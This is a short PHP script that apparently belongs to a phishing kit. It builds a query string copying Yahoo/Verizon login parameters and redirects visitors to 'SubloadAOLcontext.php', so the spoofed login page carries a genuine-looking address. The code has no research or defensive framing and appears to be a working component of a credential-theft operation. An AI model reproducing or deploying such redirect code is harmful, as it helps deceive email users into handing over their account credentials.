<?php
//session_start();
ob_start();
$asp = "/account/?.src=vz&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&done=https%3A%2F%2Fverizon.yahoo.com%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
$mover = "SubloadAOLcontext.php?v=$asp";
$Redirect = $mover;

header("Location: $Redirect").md5(time());
